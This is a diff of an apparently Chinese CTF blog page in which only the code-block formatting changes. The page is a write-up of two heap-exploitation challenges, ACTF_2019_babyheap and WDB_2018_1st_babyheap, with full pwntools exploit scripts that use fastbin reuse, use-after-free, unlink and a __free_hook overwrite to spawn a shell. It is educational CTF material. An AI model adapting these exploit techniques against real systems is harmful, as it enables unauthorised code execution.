@@ -12,10 +12,7 @@
     
         <meta name="description" content="ACTF_2019_babyheap经典的notebook题目结构, 堆利用当中最简单的类型
 有
-==============================
-This is a heap exploit demo  
-==============================
-1. Create">
+12345678&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x">
     
 
     <!--Author-->
@@ -181,14 +178,7 @@ This is a heap exploit demo
         <!-- Post Content -->
         <h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a>ACTF_2019_babyheap</h2><p>经典的notebook题目结构, 堆利用当中最简单的类型</p>
 <p>有</p>
-<pre><code>==============================
-This is a heap exploit demo  
-==============================
-1. Create something           
-2. Delete something           
-3. Print something            
-4. Exit    
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">This is a heap exploit demo  </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">1. Create something           </span><br><span class="line">2. Delete something           </span><br><span class="line">3. Print something            </span><br><span class="line">4. Exit    </span><br></pre></td></tr></table></figure>
 <p>create, delete, print 三个选项。</p>
 <p>创建的结构体如下</p>
 <table>
@@ -240,69 +230,14 @@ This is a heap exploit demo
 </tr>
 </tbody></table>
 <p>再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么</p>
-<pre><code>note2 = note1
-string2 = note0
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">note2 &#x3D; note1</span><br><span class="line">string2 &#x3D; note0</span><br></pre></td></tr></table></figure>
 <p>题目bss段中贴心的准备了<code>/bin/sh</code>字符串，也有<code>system</code>函数。<br>在create时向string2中写入</p>
-<pre><code>binsh地址 |  system的PLT表地址
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binsh地址 |  system的PLT表地址</span><br></pre></td></tr></table></figure>
 <p>print选项调用note0.函数指针，就能成功调用<code>system(&#39;/bin/sh&#39;)</code>，完整payload如下</p>
-<pre><code>if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
-    target = remote()
-else:
-    target = process(&quot;./ACTF_2019_babyheap&quot;)
-    if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
-        gdb.attach(target)
-
-context.log_level=&#39;debug&#39;
-
-binsh=0x602010
-system_plt = 0x4007A0
-def s(in_put):
-    target.sendlineafter(&quot;choice: &quot;,in_put)
-    
-    
-def create(size,content):
-    s(&quot;1&quot;)
-    target.recvuntil(&quot;size: \n&quot;)
-    target.sendline(str(size))
-    target.recvuntil(&quot;content: \n&quot;)
-    target.send(content)
-    
-    
-def delete(index):
-    s(&quot;2&quot;)
-    target.recvuntil(&quot;index: \n&quot;)
-    target.sendline(str(index))
-    
-    
-def pwn():
-    create(0x20,&quot;A&quot;*8+&quot;\n&quot;)
-    create(0x20,&quot;B&quot;*8+&quot;\n&quot;)
-    
-    delete(0)
-    delete(1)
-    create(0x10,p64(binsh)+p64(system_plt))
-
-    #use print at index 0 to getshell after this
-
-
-    target.interactive()
-
-
-pwn()
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">if len(sys.argv) &gt;1 and sys.argv[1] &#x3D;&#x3D; &#39;r&#39;:</span><br><span class="line">    target &#x3D; remote()</span><br><span class="line">else:</span><br><span class="line">    target &#x3D; process(&quot;.&#x2F;ACTF_2019_babyheap&quot;)</span><br><span class="line">    if(len(sys.argv)&gt;1) and sys.argv[1]&#x3D;&#x3D;&#39;g&#39;:</span><br><span class="line">        gdb.attach(target)</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">binsh&#x3D;0x602010</span><br><span class="line">system_plt &#x3D; 0x4007A0</span><br><span class="line">def s(in_put):</span><br><span class="line">    target.sendlineafter(&quot;choice: &quot;,in_put)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def create(size,content):</span><br><span class="line">    s(&quot;1&quot;)</span><br><span class="line">    target.recvuntil(&quot;size: \n&quot;)</span><br><span class="line">    target.sendline(str(size))</span><br><span class="line">    target.recvuntil(&quot;content: \n&quot;)</span><br><span class="line">    target.send(content)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def delete(index):</span><br><span class="line">    s(&quot;2&quot;)</span><br><span class="line">    target.recvuntil(&quot;index: \n&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def pwn():</span><br><span class="line">    create(0x20,&quot;A&quot;*8+&quot;\n&quot;)</span><br><span class="line">    create(0x20,&quot;B&quot;*8+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line">    delete(0)</span><br><span class="line">    delete(1)</span><br><span class="line">    create(0x10,p64(binsh)+p64(system_plt))</span><br><span class="line"></span><br><span class="line">    #use print at index 0 to getshell after this</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
 <hr>
 <h2 id="WDB-2018-1st-babyheap"><a href="#WDB-2018-1st-babyheap" class="headerlink" title="WDB_2018_1st_babyheap"></a>WDB_2018_1st_babyheap</h2><p>同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.</p>
-<pre><code>I thought this is really baby.What about u?
-Loading.....
-1.alloc
-2.edit
-3.show
-4.free
-5.exit
-Choice:
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">I thought this is really baby.What about u?</span><br><span class="line">Loading.....</span><br><span class="line">1.alloc</span><br><span class="line">2.edit</span><br><span class="line">3.show</span><br><span class="line">4.free</span><br><span class="line">5.exit</span><br><span class="line">Choice:</span><br></pre></td></tr></table></figure>
 <p>漏洞点出在<code>4.free</code> 选项中,调用<code>free()</code>之后没有清空指针,存在UAF.<br>但是<code>2.edit</code>的使用次数被限制在了三次以内.</p>
 <p>思路如下: </p>
 <ol>
@@ -316,147 +251,28 @@ Choice:
 </li>
 </ol>
 <p>那么先从泄露堆地址开始做</p>
-<pre><code>alloc(0,&quot;a\n&quot;)
-alloc(1,&quot;b\n&quot;)
-free(1)
-free(0)
-
-show(0)
-heap_leak = u64(target.recv(6).ljust(8,&#39;\x00&#39;))
-success(hex(heap_leak))
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alloc(0,&quot;a\n&quot;)</span><br><span class="line">alloc(1,&quot;b\n&quot;)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">heap_leak &#x3D; u64(target.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">success(hex(heap_leak))</span><br></pre></td></tr></table></figure>
 <p>fastbin是FILO的,两次<code>free</code>之后,fastbins 如下<br>|fastbin|<br>|-|<br>|chunk0 @index0|<br>|🠗|<br>|chunk1 @index1|</p>
 <p>chunk0-&gt;fd指向chunk1,因此<code>show(0)</code>可以泄露出chunk1的Prev_size地址(即heap+0x30)<br>注意此处释放顺序,第一个chunk地址低字节是\x00且程序为小端序,因此调换释放顺序后,我们无法用chunk1泄露chunk0的地址.</p>
 <p>然后进行fastbin attack,构造chunk重叠</p>
-<pre><code>edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))</span><br></pre></td></tr></table></figure>
 <p>如此,chunk0的fd便指向 chunk1-0x10, 也就是chunk0+0x20的位置.<br>我们那里构建一个size为0x30的fake chunk,造成chunk重叠.</p>
 <p>接着进行分配,要记得fastbin是FILO的</p>
-<pre><code>alloc(6,&quot;aaaa\n&quot;)  #chunk0 @index6
-alloc(7,p64(0)+p64(0xa1)+&quot;\n&quot;) #fake chunk @index7
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(6,&quot;aaaa\n&quot;)  #chunk0 @index6</span><br><span class="line">alloc(7,p64(0)+p64(0xa1)+&quot;\n&quot;) #fake chunk @index7</span><br></pre></td></tr></table></figure>
 <p>我们获取到的fake chunk @index7指向 chunk1-0x10,因此对其mem区域进行编辑,便能够编辑到 chunk1的size.</p>
 <p>将该fakechunk填充至0x90 大小</p>
-<pre><code>alloc(2,&quot;CCCCCCC\n&quot;)
-alloc(3,&quot;DDDDDDD\n&quot;)
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(2,&quot;CCCCCCC\n&quot;)</span><br><span class="line">alloc(3,&quot;DDDDDDD\n&quot;)</span><br></pre></td></tr></table></figure>
+
 <p>最终的任意地址写需要依靠unlink实现,此处开始构造<br>chunk4 @index4 的prev_size 与 size会被算在fake chunk内,因此我们可以再伪造一个fake chunk.<br>0x602080即是index4地址</p>
 <p>剩下的就是常规绕过unlink检查的操作,</p>
-<pre><code>#bypass unlink check
-alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10))
-alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#bypass unlink check</span><br><span class="line">alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10))</span><br><span class="line">alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)</span><br></pre></td></tr></table></figure>
 <p>释放0xa1大小的fake chunk, 他会被放入unsorted bin中.<br>回顾, unsorted bin中的<code>fd</code>指向<code>main_arena</code>, 依此泄露出libc</p>
-<pre><code>free(1)
-show(1)
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">show(1)</span><br></pre></td></tr></table></figure>
 <p>同时,我们也触发了unlink,index4(0x602080) 会指向 index1 (0x602080-0x18 = 0x602068)</p>
 <p>之后利用edit函数实现任意地址写,改<code>__free_hook</code> 为 <code>system</code>.<br>类似地,我们也可以改<code>__free_hook</code>为one_gadget</p>
-<pre><code>edit(4,p64(free_hook)+&quot;\n&quot;)
-edit(1,p64(system)+&quot;\n&quot;)
-
-alloc(8,&quot;/bin/sh\x00&quot;+&#39;\n&#39;)
-free(8)
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(4,p64(free_hook)+&quot;\n&quot;)</span><br><span class="line">edit(1,p64(system)+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">alloc(8,&quot;&#x2F;bin&#x2F;sh\x00&quot;+&#39;\n&#39;)</span><br><span class="line">free(8)</span><br></pre></td></tr></table></figure>
 <p>完整exp</p>
-<pre><code>from pwn import *
-import sys
-
-
-if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
-    target = remote(&quot;node3.buuoj.cn&quot;,26070 )
-else:
-    #target = process(&quot;&quot;)
-    target=process([&quot;/home/trident/ctfworkspace/glibc/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;,&quot;./wdb_2018_1st_babyheap&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)
-    if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
-        gdb.attach(target)
-
-context.log_level=&#39;debug&#39;
-#context.update(arch=&#39;&#39;)
-#gdb.attach(target)
-libC = ELF(&quot;./libc.so.6&quot;)
-
-
-def alloc(index,content):
-    target.recvuntil(&quot;oice:&quot;)
-    target.sendline(&quot;1&quot;)
-
-    target.recvuntil(&quot;Index:&quot;)
-    target.sendline(str(index))
-    target.recvuntil(&quot;tent:&quot;)
-    target.send(content)
-
-def edit(index,content):
-    target.recvuntil(&quot;oice:&quot;)
-    target.sendline(&quot;2&quot;)
-    target.recvuntil(&quot;Index:&quot;)
-    target.sendline(str(index))
-    target.recvuntil(&quot;tent:&quot;)
-    target.send(content)
-
-
-def show(index):
-    target.recvuntil(&quot;oice:&quot;)
-    target.sendline(&quot;3&quot;)
-    target.recvuntil(&quot;Index:&quot;)
-    target.sendline(str(index))
-
-
-def free(index):
-    target.recvuntil(&quot;oice:&quot;)
-    target.sendline(&quot;4&quot;)
-    target.recvuntil(&quot;Index:&quot;)
-    target.sendline(str(index))
-
-
-
-def pwn():
-    alloc(0,&quot;a\n&quot;)
-    alloc(1,&quot;b\n&quot;)
-    free(1)
-    free(0)
-    
-    show(0)
-    heap_leak = u64(target.recv(6).ljust(8,&#39;\x00&#39;)) 
-    success(hex(heap_leak))
-    
-    edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
-    
-    alloc(6,&quot;aaaa\n&quot;)
-    alloc(7,p64(0)+p64(0xa1)+&quot;\n&quot;)
-    alloc(2,&quot;CCCCCCC\n&quot;)
-    alloc(3,&quot;DDDDDDD\n&quot;)
-
-    alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10)) #bypass unlink check
-    alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)
-    
-
-
-    free(1)
-    show(1)
-    
-    leak2 = u64(target.recv(6).ljust(8,&#39;\x00&#39;))
-    success(hex(leak2))
-    libc_leak = leak2 - 0x3c4b78
-    success(&quot;leaked libc: &quot; + hex(libc_leak))
-    
-
-    system = libc_leak + 0x45390
-    success(&quot;system: &quot; + hex(system))
-    free_hook = libc_leak + libC.symbols[&#39;__free_hook&#39;]
-    success(&quot;free_hook: &quot;+hex(free_hook))
-    
-    edit(4,p64(free_hook)+&quot;\n&quot;)
-    edit(1,p64(system)+&quot;\n&quot;)
-    
-    alloc(8,&quot;/bin/sh\x00&quot;+&#39;\n&#39;)
-    free(8)
-
-    target.interactive()
-
-
-pwn()
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt;1 and sys.argv[1] &#x3D;&#x3D; &#39;r&#39;:</span><br><span class="line">    target &#x3D; remote(&quot;node3.buuoj.cn&quot;,26070 )</span><br><span class="line">else:</span><br><span class="line">    #target &#x3D; process(&quot;&quot;)</span><br><span class="line">    target&#x3D;process([&quot;&#x2F;home&#x2F;trident&#x2F;ctfworkspace&#x2F;glibc&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.23-0ubuntu11.2_amd64&#x2F;ld-2.23.so&quot;,&quot;.&#x2F;wdb_2018_1st_babyheap&quot;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc.so.6&quot;&#125;)</span><br><span class="line">    if(len(sys.argv)&gt;1) and sys.argv[1]&#x3D;&#x3D;&#39;g&#39;:</span><br><span class="line">        gdb.attach(target)</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#context.update(arch&#x3D;&#39;&#39;)</span><br><span class="line">#gdb.attach(target)</span><br><span class="line">libC &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def alloc(index,content):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvuntil(&quot;tent:&quot;)</span><br><span class="line">    target.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;2&quot;)</span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvuntil(&quot;tent:&quot;)</span><br><span class="line">    target.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;3&quot;)</span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    target.recvuntil(&quot;oice:&quot;)</span><br><span class="line">    target.sendline(&quot;4&quot;)</span><br><span class="line">    target.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    alloc(0,&quot;a\n&quot;)</span><br><span class="line">    alloc(1,&quot;b\n&quot;)</span><br><span class="line">    free(1)</span><br><span class="line">    free(0)</span><br><span class="line">    </span><br><span class="line">    show(0)</span><br><span class="line">    heap_leak &#x3D; u64(target.recv(6).ljust(8,&#39;\x00&#39;)) </span><br><span class="line">    success(hex(heap_leak))</span><br><span class="line">    </span><br><span class="line">    edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))</span><br><span class="line">    </span><br><span class="line">    alloc(6,&quot;aaaa\n&quot;)</span><br><span class="line">    alloc(7,p64(0)+p64(0xa1)+&quot;\n&quot;)</span><br><span class="line">    alloc(2,&quot;CCCCCCC\n&quot;)</span><br><span class="line">    alloc(3,&quot;DDDDDDD\n&quot;)</span><br><span class="line"></span><br><span class="line">    alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10)) #bypass unlink check</span><br><span class="line">    alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(1)</span><br><span class="line">    show(1)</span><br><span class="line">    </span><br><span class="line">    leak2 &#x3D; u64(target.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">    success(hex(leak2))</span><br><span class="line">    libc_leak &#x3D; leak2 - 0x3c4b78</span><br><span class="line">    success(&quot;leaked libc: &quot; + hex(libc_leak))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    system &#x3D; libc_leak + 0x45390</span><br><span class="line">    success(&quot;system: &quot; + hex(system))</span><br><span class="line">    free_hook &#x3D; libc_leak + libC.symbols[&#39;__free_hook&#39;]</span><br><span class="line">    success(&quot;free_hook: &quot;+hex(free_hook))</span><br><span class="line">    </span><br><span class="line">    edit(4,p64(free_hook)+&quot;\n&quot;)</span><br><span class="line">    edit(1,p64(system)+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line">    alloc(8,&quot;&#x2F;bin&#x2F;sh\x00&quot;+&#39;\n&#39;)</span><br><span class="line">    free(8)</span><br><span class="line"></span><br><span class="line">    target.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
 
     </div>
 
